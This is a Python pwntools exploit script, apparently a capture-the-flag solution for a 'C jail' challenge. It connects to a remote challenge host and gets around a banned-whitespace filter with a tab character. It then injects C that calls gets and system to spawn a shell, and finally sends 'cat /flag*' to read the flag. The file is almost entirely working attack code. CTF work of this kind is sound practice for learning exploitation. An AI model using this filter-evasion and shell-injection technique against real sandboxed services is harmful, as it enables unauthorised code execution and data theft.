#!/usr/bin/env python3
"""Pixel Perfect - C jail escape via tab + gets + system"""
from pwn import *

# Remote
HOST = 'dyn-01.midnightflag.fr'
PORT = 12735

r = remote(HOST, PORT)
r.recvuntil(b'> ')

# Tab (\t) is not banned! Use it as whitespace separator in C.
# long\ta; → declares 8-byte buffer
# gets(&a); → reads command from stdin into buffer
# system(&a); → executes command
r.sendline(b'long\ta;gets(&a);system(&a);')
r.recvuntil(b'Good luck!')

import time; time.sleep(0.3)
r.sendline(b'sh')
time.sleep(0.5)
r.sendline(b'cat /flag*')
time.sleep(0.5)
r.sendline(b'exit')

try:
    data = r.recvrepeat(3)
    log.success(data.decode(errors='replace'))
except:
    pass
r.close()
